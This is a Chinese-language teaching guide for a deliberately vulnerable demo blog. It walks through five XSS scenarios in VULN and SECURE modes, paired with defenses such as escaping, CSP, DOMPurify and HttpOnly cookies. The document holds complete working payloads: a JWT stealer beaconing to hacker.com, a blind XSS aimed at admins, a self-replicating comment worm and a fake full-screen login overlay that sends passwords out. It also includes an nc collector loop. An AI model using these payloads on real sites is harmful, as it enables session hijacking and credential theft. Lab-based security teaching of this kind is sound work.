# XSSBlog - XSS 演示场景详细说明

**Cross-Site Scripting Demo Blog** - 详细教学指南

⚠️ **本文档仅用于授权的安全教学，请勿用于非法用途**

---

## 🎯 演示前准备

### 1. 启动攻击收集器（可选）
用于接收场景 2、3、4、5 的数据上报：

```bash
# 简易 HTTP 服务器接收数据
python3 -m http.server 7777
# 或使用 nc
while true; do nc -l 7777; done
```

### 2. 切换到 VULN 模式
- 点击页面左上角红色 VULN 徽章确认
- 或检查：`fetch('/api/config').then(r=>r.json()).then(console.log)`

### 3. 测试账号
| 用户名 | 密码 | 用途 |
|--------|------|------|
| admin | Admin#2025 | 场景 3（盲 XSS，管理员查看反馈触发） |
| alice | Admin#2025 | 场景 4（评论蠕虫发起者） |
| attacker | Attacker#2025 | 场景 5（Bio 钓鱼，个人主页 XSS） |

---

## 场景 1:Hello, XSS

### 目标
确认 XSS 漏洞存在,验证代码能执行。

### 攻击步骤
直接访问(已 URL 编码):
```
http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

或手动输入搜索框:
```html
<img src=x onerror=alert(1)>
```

### 预期结果
- **VULN 模式**:弹窗显示 `1`
- **SECURE 模式**:显示转义后的文本 `<img src=x onerror=alert(1)>`

### 技术原理
- 后端 [SearchController](apps/backend/src/main/java/com/xssblog/backend/controller/SearchController.java) VULN 模式直接拼接用户输入
- 前端 [Search.vue](apps/frontend/src/pages/Search.vue) 用 `v-html` 渲染后端返回的 message

### 防御机制
- **后端**:`HtmlUtils.htmlEscape()` 转义特殊字符
- **前端**:避免 `v-html`,改用文本插值 `{{ }}`

---

## 场景 2:窃取用户JWT

### 目标
盗取存储在 localStorage 中的 JWT 凭证。

### 攻击步骤
1. 准备 Payload(复制整段):
```html
<img src=x onerror="new Image().src='http://hacker.com/jwt='+localStorage.getItem('accessToken');">
```

2. 对 Payload 进行 URL 编码(浏览器 Console):
```javascript
encodeURIComponent(`<img src=x onerror="new Image().src='http://hacker.com/jwt='+localStorage.getItem('accessToken');">`) 
```

3. 拼接 URL 并访问:
```
http://localhost:5173/search?q=<编码后的结果>
```

### 预期结果
- **VULN 模式**:
  - 页面不弹窗
  - 收集器终端接收到 JWT Token

- **SECURE 模式**:
  - Payload 被转义,不执行
  - 收集器无数据

### 技术细节
- 读取 `localStorage.getItem('accessToken')`
- 使用 `new Image().src` 绕过 CORS 发送数据
- 在实战中会配合短链接服务提高隐蔽性

---

## 场景 3：XSS盲打

### 目标
通过反馈功能盲打管理员，窃取管理员 JWT 凭证。

### 攻击步骤
1. 访问 `/feedback` 页面（无需登录）

2. 填写反馈表单：
   - **邮箱**：`evil@hacker.com`
   - **反馈内容**：
```html
<img src=x onerror="new Image().src='http://hacker.com/jwt='+localStorage.getItem('accessToken');">
```

3. 点击「提交反馈」

4. 使用 **admin** 账号登录

5. 访问 `/admin/feedbacks`

6. 点击刚才提交的反馈的「查看」按钮

### 预期结果
- **VULN 模式**：
  - 管理员无感知
  - 攻击者服务器接收到管理员的 JWT Token

- **SECURE 模式**：
  - 反馈存储时被转义：`&lt;img src=x...&gt;`
  - 前端渲染为纯文本
  - 不执行，收集器无数据

### 技术细节
- **盲打**：攻击者不知道何时触发
- **高价值目标**：管理员权限
- **隐蔽性强**：无视觉反馈
- **会话劫持**：获取 JWT 可伪造管理员身份

### 防御要点
- **后端**：存储前进行 HTML 转义
- **前端**：使用文本渲染而非 `v-html`

---

## 场景 4：评论蠕虫 ⭐

### 目标
展示存储型 XSS 的自传播能力，模拟蠕虫式扩散。

### 攻击步骤
1. 使用 **alice** 账号登录

2. 访问文章详情页（如 `/article/1`）

3. 在评论框粘贴以下 Payload：
```html
<img src=x onerror="
(async function(){
  const cur = (location.pathname.match(/\/article\/(\d+)/)||[])[1];
  if(!cur) return;
  
  const curNum = Number(cur);
  const targets = [];
  
  for(let offset of [-1, 1, 2]){
    const targetId = curNum + offset;
    if(targetId > 0 && targetId !== curNum){
      targets.push(String(targetId));
    }
  }
  
  for(let i = 3; targets.length < 3 && i <= 10; i++){
    const targetId = curNum + i;
    if(!targets.includes(String(targetId))){
      targets.push(String(targetId));
    }
  }
  
  const payload = this.outerHTML;
  const token = localStorage.getItem('accessToken');
  
  for(const id of targets.slice(0,3)){
    try{
      await fetch('/api/articles/'+id+'/comments', {
        method:'POST',
        headers:{
          'Content-Type':'application/json',
          'Authorization': token ? 'Bearer '+token : ''
        },
        body: JSON.stringify({content: payload}),
        credentials: 'same-origin'
      });
    }catch(e){}
  }
}).call(this);
">
```

4. 点击「发表评论」

5. 访问其他文章（如 `/article/2`、`/article/3`）观察传播

### 预期结果
- **VULN 模式**：
  - 评论成功发表
  - 蠕虫自动复制到其他文章的评论区
  - 每次访问传播到 3 篇文章（通过文章ID偏移计算）

- **SECURE 模式**：
  - 评论存储时被转义：`&lt;img src=x...&gt;`
  - 前端渲染为纯文本
  - 不执行，不传播

### 技术亮点
- **目标选择**：通过当前文章ID计算偏移量（-1, +1, +2, +3...+10）
- **可控传播**：最多传播到 3 个目标
- **自我复制**：`this.outerHTML` 复制自身，使用 `.call(this)` 绑定上下文

### 清理方法
- 删除带毒评论
- 或切换到 SECURE 模式

---

## 场景 5：伪造登录页钓鱼

### 目标
通过 CSS 伪造全屏登录界面，诱骗用户输入账号密码。

### 攻击步骤
1. 使用 **attacker** 账号登录

2. 访问个人主页 `/profile/attacker`

3. 点击「编辑简介」按钮

4. 粘贴以下 Payload：
```html
<style>
#f{position:fixed;left:0;right:0;bottom:0;top:var(--nav,0);background:#0B1220;z-index:2147483646;display:grid;place-items:center}
#f .toast{position:fixed;left:50%;top:calc(var(--nav,0) + 12px);transform:translateX(-50%);padding:8px 16px;border-radius:9999px;font-size:14px;border:1px solid;display:none;box-shadow:0 6px 24px rgba(0,0,0,.18);z-index:2147483647}
#f .toast.err{background:#FEE2E2;color:#991B1B;border-color:#FECACA}
#f .toast.ok{background:#DCFCE7;color:#065F46;border-color:#BBF7D0}
#f .card{width:100%;max-width:450px;background:#0F1625;border:1px solid #1e293b;border-radius:16px;padding:32px 36px;box-shadow:0 20px 60px rgba(0,0,0,.35)}
#f h2{margin:0 0 10px;color:#E5ECF5;font-size:32px;text-align:center;font-weight:800}
#f .subtitle{margin:0 0 20px;color:#94A3B8;text-align:center;font-size:14px}
#f .el-form-item{margin-bottom:22px}
#f .submit-btn{width:100%}
</style>

<div id="f">
  <div id="toast" class="toast"></div>
  <form class="card el-form el-form--large el-form--label-top" onsubmit="return __p.s(event,this)">
    <h2>登录</h2><p class="subtitle">欢迎回到 TechBlog</p>
    <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-top">
      <label class="el-form-item__label">用户名</label>
      <div class="el-form-item__content"><div class="el-input el-input--large"><div class="el-input__wrapper">
        <input class="el-input__inner" name="u" placeholder="请输入用户名" required autocomplete="off">
      </div></div></div>
    </div>
    <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-top">
      <label class="el-form-item__label">密码</label>
      <div class="el-form-item__content"><div class="el-input el-input--large el-input--suffix"><div class="el-input__wrapper">
        <input class="el-input__inner" name="p" type="password" placeholder="请输入密码" required autocomplete="off">
        <span class="el-input__suffix"><span class="el-input__suffix-inner"></span></span>
      </div></div></div>
    </div>
    <div class="el-form-item el-form-item--large el-form-item--label-top">
      <div class="el-form-item__content"><button type="submit" class="el-button el-button--primary el-button--large submit-btn"><span> 登录 </span></button></div>
    </div>
    <div class="auth-footer">还没有账号？ <a href="/register">立即注册</a></div>
  </form>
</div>

<img src=x onerror="(function(d,w){
  var f=d.getElementById('f');if(!f)return;if(f.parentNode!==d.body)d.body.appendChild(f);
  var h=d.querySelector('.app-header,header,nav,.navbar,.site-header');var t=h?h.getBoundingClientRect().bottom:0;d.documentElement.style.setProperty('--nav',t+'px');
  var sb=w.innerWidth-d.documentElement.clientWidth;f.dataset.o=d.body.style.overflow||'';f.dataset.p=d.body.style.paddingRight||'';d.body.style.overflow='hidden';if(sb>0)d.body.style.paddingRight=sb+'px';
  var toast=d.getElementById('toast');
  function show(type,msg,ms){toast.className='toast '+type;toast.textContent=msg;toast.style.display='block';setTimeout(function(){toast.style.display='none'},ms);}
  window.__p={s:function(e,form){
    e.preventDefault();
    var n=(+localStorage.getItem('xlp_attempts')||0)+1;localStorage.setItem('xlp_attempts',n);
    try{var pay={where:'bio',attempt:n,u:form.u.value,p:form.p.value,href:location.href,ts:Date.now(),ua:navigator.userAgent};
      var d64=btoa(unescape(encodeURIComponent(JSON.stringify(pay))));
      new Image().src='http://127.0.0.1/x?d='+encodeURIComponent(d64);}catch(_){}
    if(n<3){show('err','登录失败,请检查用户名和密码',1800);return false;}
    show('ok','登录成功！',900);
    setTimeout(function(){d.body.style.overflow=f.dataset.o;d.body.style.paddingRight=f.dataset.p;f.remove();},820);
    return false;
  }};
})(document,window)">
```

5. 点击「保存」

6. 退出登录，以其他身份（如 alice）访问 `/profile/attacker`

### 预期结果
- **VULN 模式**：
  - 全屏伪造登录页覆盖
  - 包含项目 Logo 和配色
  - 前两次输入提示“登录失败”
  - 第三次输入显示“登录成功”，然后取消覆盖
  - 收集器接收到三次请求（Base64编码），解码后获取明文密码

- **SECURE 模式**：
  - DOMPurify 过滤掉 `<style>` 和 `<script>`
  - 只显示纯文本

### 技术细节
- **全屏覆盖**：`position:fixed; inset:0; z-index:2147483646`
- **视觉仿真**：使用项目配色
- **表单内联**：`onsubmit` 直接处理提交
- **三次验证**：前两次提示错误，第三次显示成功后移除覆盖
- **Base64编码**：数据编码后上报，提高隐蔽性



---

## 🛡️ 防御措施总结

### 后端防御
```java
// 1. HTML 转义（场景 1/2/3/4）
if (xssProperties.isSecure()) {
    content = HtmlUtils.htmlEscape(userInput);
}

// 2. CSP 响应头（SECURE 模式）
.contentSecurityPolicy(csp -> csp.policyDirectives(
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline';"
))
```

### 前端防御
```javascript
// 1. 文本渲染（场景 1/2/3/4）
<div>{{ userInput }}</div>  // ✅ 安全

// 2. DOMPurify 白名单过滤（场景 5）
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: { 'a': ['href', 'title'] }
});

// 3. 避免不安全的 v-html
<div v-html="userInput"></div>  // ❌ 危险（仅场景 5 VULN 模式使用）
```

### JWT 存储
```javascript
// ❌ VULN：localStorage（可被 JS 读取）
localStorage.setItem('accessToken', token);

// ✅ SECURE：HttpOnly Cookie（JS 无法访问）
Cookie cookie = new Cookie("access", token);
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setSameSite("Strict");
```

---

## 📊 场景对比

| 场景 | 类型 | 隐蔽性 | 影响范围 | 触发条件 |
|------|------|--------|----------|----------|
| 1 | 反射型 | 低 | 点击链接的用户 | 主动点击 |
| 2 | 反射型 | 中 | 点击链接的用户 | 主动点击 |
| 3 | 存储型/盲XSS | 极高 | 管理员（高价值目标） | 管理员查看 |
| 4 | 存储型 | 中 | 所有访问相关文章的用户 | 访问文章 |
| 5 | 存储型 | 高 | 所有访问特定主页的用户 | 访问主页 |

---

## 🎓 教学建议

### 演示流程
1. **第一阶段**：VULN 模式依次演示场景 1→5，讲解危害
2. **第二阶段**：切换 SECURE 模式重复操作，观察防御效果
3. **第三阶段**：代码 Review，讲解防御机制实现

### 重点强调
- **Cookie 安全属性**：HttpOnly + Secure + SameSite
- **输出编码**：后端 HTML 转义 + 前端文本渲染
- **分场景防御**：场景 1/2/3/4 纯文本，场景 5 DOMPurify 过滤
- **CSP 策略**：限制脚本来源，防止内联脚本
- **最小权限原则**：普通用户无法访问管理后台

---

## 🔧 故障排查

### 问题：XSS 不生效
- 确认当前为 VULN 模式（红色徽章）
- 清空浏览器缓存重试
- 检查 Console 是否有错误

### 问题：收集器无数据
- 确认收集器已启动在 7777 端口
- 检查浏览器 Network 是否有跨域错误
- 尝试换成 `127.0.0.1` 或 `localhost`

### 问题：Bio 保存失败
- 检查 Payload 长度是否超过 3000 字符
- 查看后端日志是否有验证错误

---

## ⚠️ 免责声明

本项目仅用于授权的安全研究与教学。使用者须遵守法律法规，产生的后果自负。

**使用前请确认**：
- ✅ 已获得授权
- ✅ 仅在隔离环境中运行
- ✅ 不连接公网
- ✅ 理解其中的安全风险
